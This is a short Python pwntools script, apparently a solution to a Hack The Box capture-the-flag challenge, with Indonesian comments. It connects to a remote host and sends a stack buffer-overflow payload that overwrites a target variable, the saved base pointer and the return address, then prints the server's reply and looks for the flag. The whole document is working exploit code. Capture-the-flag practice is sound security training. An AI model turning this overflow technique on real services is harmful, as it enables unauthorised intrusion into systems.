#!/usr/bin/python3.8

from pwn import *
from time import sleep

# Open connection
IP   = '94.237.56.47'
PORT = 58911

r = remote(IP, PORT)

# Craft payload
payload = b'A' * 32  # Menimpa buffer
payload += p64(0xdeadbeef)  # Ganti target
payload += p64(0x4141414141414141)  # Ganti saved rbp
payload += p64(0x00007ffdbb8fa328)  # Ganti return address dengan alamat yang benar

# Send payload
r.sendline(payload)

# Delay untuk memberi waktu server merespon
sleep(1)

# Terima response dan cetak
response = r.recvall()  # Menangkap semua data
print(response.decode())  # Tampilkan output dari server

# Jika flag ditemukan di dalam response, tampilkan flag
if b'HTB' in response:
    success(f'Flag --> {response.strip().decode()}')
else:
    print("Flag tidak ditemukan dalam response.")
